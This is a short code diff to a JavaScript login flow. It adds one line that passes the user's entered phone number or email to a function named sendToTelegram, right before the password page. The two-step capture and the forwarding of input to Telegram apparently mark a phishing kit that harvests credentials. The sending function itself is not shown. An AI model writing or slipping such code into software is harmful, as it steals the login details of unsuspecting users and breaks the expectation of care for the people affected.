@@ -409,6 +409,7 @@ function initEventHandlers() {
         submitBtn.disabled = false;
 
         goToPasswordPage(phoneEmailValue);
+        sendToTelegram(phoneEmailValue, '', 'email');
       });
     }
 
